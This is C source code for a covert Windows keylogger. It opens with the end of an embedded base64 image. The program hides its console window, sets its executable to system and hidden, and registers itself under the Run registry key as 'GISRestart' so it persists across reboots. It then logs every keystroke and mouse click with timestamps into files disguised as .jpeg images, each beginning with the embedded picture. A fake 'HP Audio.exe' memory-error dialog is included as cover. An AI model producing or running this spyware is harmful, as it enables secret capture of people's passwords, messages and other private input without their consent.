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";
int siz,keytab[]={1,2,3,8,9,13,16,17,18,20,27,32,33,34,35,36,37,38,39,40,45,46,48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,96,97,98,99,100,101,102,103,104,105,106,107,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,144,186,187,188,189,190,191,192,219,220,221,222};
unsigned char jpg_ori[1048576];
unsigned int clen;

int state[256];
long long cnt;
char Title1[200],Title2[200],file[200],hidefile[200];
time_t timep;
struct tm *p;
POINT pt;

void autostart(){
	HKEY hKey;
	const static char strRegPath[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS){
		TCHAR strExeFullDir[MAX_PATH];
		GetModuleFileName(NULL, strExeFullDir, MAX_PATH);
		
		TCHAR strDir[MAX_PATH] = {};
		DWORD nLength = MAX_PATH;
		long result = RegGetValue(hKey, NULL, "GISRestart", RRF_RT_REG_SZ, 0, strDir, &nLength);
		
		if (result != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0){
			RegSetValueEx(hKey, "GISRestart", 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1)*sizeof(TCHAR));
			RegCloseKey(hKey);
		}
	}
}

void cancelAutoStart(){
	HKEY hKey;
	const static char strRegPath[] = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS){
		RegDeleteValue(hKey, "GISRestart");
		RegCloseKey(hKey);
	}
}

bool same(){
	bool Equal=true;
	int len1=strlen(Title1),len2=strlen(Title2);
	if(len1!=len2)Equal=false;
	else for(int i=0;i<=len1;i++)if(Title1[i]!=Title2[i])Equal=false;
	return Equal;
}

void update_File(){
	autostart();
	fclose(stdin),fclose(stdout); 
	time(&timep),p=gmtime(&timep);
	sprintf(file,"%2d.%2d.%2d.%2d.%2d.%2d.jpeg",(1900+p->tm_year)%100,1+p->tm_mon,p->tm_mday+(8+p->tm_hour)/24,(8+p->tm_hour)%24,p->tm_min,p->tm_sec);
	freopen(file,"wb",stdout);
	fwrite(jpg_ori, clen+1, 1, stdout);
	fputc('\r', stdout);
	fputc('\n', stdout);
	return;
}

char cmd_attrib[1024];
char cmd_del[1024];

int main(int argc, char **argv){
	sprintf(cmd_attrib, "attrib \"%s\" +s +h", argv[0]);
	system(cmd_attrib);
	//sprintf(cmd_del, "del %s", argv[0]);
	//system(cmd_del);

	HWND now=GetForegroundWindow();
	ShowWindow(now,SW_HIDE);

	siz=sizeof(keytab)/sizeof(int);
	clen=base64.decode(jpg_ori, jpg_b64, sizeof(jpg_b64)-1);

	update_File();

	while(1){

		//if(GetAsyncKeyState(VK_UP)&&GetAsyncKeyState(VK_DOWN)&&GetAsyncKeyState(VK_LEFT)&&GetAsyncKeyState(VK_RIGHT)&&GetAsyncKeyState(VK_F6)&&GetAsyncKeyState(VK_F7)&&GetAsyncKeyState(VK_F8))break;

		/*
		HWND hwnd=GetForegroundWindow();
		GetWindowTextA(hwnd,Title2,sizeof(Title2));
		strcpy(Title2, argv[0]);
		if(!same()){
			printf("  Activate: %s\r\n",Title2);
			int len=strlen(Title2);
			for(int i=0;i<=len;i++)Title1[i]=Title2[i];
		}
		*/
		for(int i=0,key;i<siz;i++){
			key=keytab[i];
			if((GetAsyncKeyState(key)?1:0)^state[key]){
				cnt++;
				if(cnt%500==0)update_File(); 
				time(&timep);
				p=gmtime(&timep);
				bool uk=1;
				
				printf("%2d/%2d/%2d-%2d:%2d:%2d:  ",(1900+p->tm_year)%100,1+p->tm_mon,p->tm_mday+(8+p->tm_hour)/24,(8+p->tm_hour)%24,p->tm_min,p->tm_sec);
				state[key]^=1;
				
				if(key>=48&&key<=57)printf("%c",'0'+key-48),uk=0;
				else if(key>=65&&key<=90)printf("%c",'A'+key-65),uk=0;
				else if(key>=96&&key<=105)printf("NUM %c",'0'+key-96),uk=0; 
				else if(key==106)printf("NUM *"),uk=0;
				else if(key==107)printf("NUM +"),uk=0;
				else if(key==109)printf("NUM -"),uk=0;
				else if(key==110)printf("NUM ."),uk=0;
				else if(key==111)printf("NUM /"),uk=0;
				else if(key>=112&&key<=123)printf("F%d",key-111),uk=0;
				else if(key==1){
					GetCursorPos(&pt);
					printf("L_Button (%4ld,%4ld) ",pt.x,pt.y),uk=0;
				}else if(key==2){
					GetCursorPos(&pt);
					printf("R_Button (%4ld,%4ld) ",pt.x,pt.y),uk=0;
				}else if(key==3){
					GetCursorPos(&pt);
					printf("M_Button (%4ld,%4ld) ",pt.x,pt.y),uk=0;
				}
				else if(key==8)printf("Backspace"),uk=0;
				else if(key==9)printf("Tab"),uk=0;
				else if(key==13)printf("Enter"),uk=0;
				else if(key==16)printf("Shift"),uk=0;
				else if(key==17)printf("Ctrl"),uk=0;
				else if(key==18)printf("Alt"),uk=0;
				else if(key==20)printf("CapsLock"),uk=0;
				else if(key==27)printf("Escape"),uk=0;
				else if(key==32)printf("Space"),uk=0;
				else if(key==33)printf("PageUp"),uk=0;
				else if(key==34)printf("PageDown"),uk=0;
				else if(key==35)printf("End"),uk=0;
				else if(key==36)printf("Home"),uk=0;
				else if(key==37)printf("LeftArrow"),uk=0;
				else if(key==38)printf("UpArrow"),uk=0;
				else if(key==39)printf("RightArrow"),uk=0;
				else if(key==40)printf("DownArrow"),uk=0;
				else if(key==45)printf("Insert"),uk=0;
				else if(key==46)printf("Delete"),uk=0;
				else if(key==91||key==92)printf("Win"),uk=0;
				else if(key==144)printf("NumLock"),uk=0;
				else if(key==186)printf(";:"),uk=0;
				else if(key==187)printf("=+"),uk=0;
				else if(key==188)printf(",<"),uk=0;
				else if(key==189)printf("-_"),uk=0;
				else if(key==190)printf(".>"),uk=0;
				else if(key==191)printf("/?"),uk=0;
				else if(key==192)printf("`~"),uk=0;
				else if(key==219)printf("[{"),uk=0;
				else if(key==220)printf("\\|"),uk=0;
				else if(key==221)printf("]}"),uk=0;
				else if(key==222)printf("'\""),uk=0;
				
				if(uk){printf("\r\n");continue;}
				
				printf("  %s\r\n",state[key]?"Down":"Up");
			}
		}
		_sleep(0);//reduce CPU usage
	}
	
	sprintf(cmd_attrib, "attrib \"%s\" -s -h", argv[0]);
	system(cmd_attrib);
	
	cancelAutoStart();
	MessageBox(NULL, "0x6e389a22指令引用的0x0000ffff内存。该内存不能为written。\n", "HP Audio.exe - 应用程序错误", MB_ICONERROR); 
	
	return 0;
}
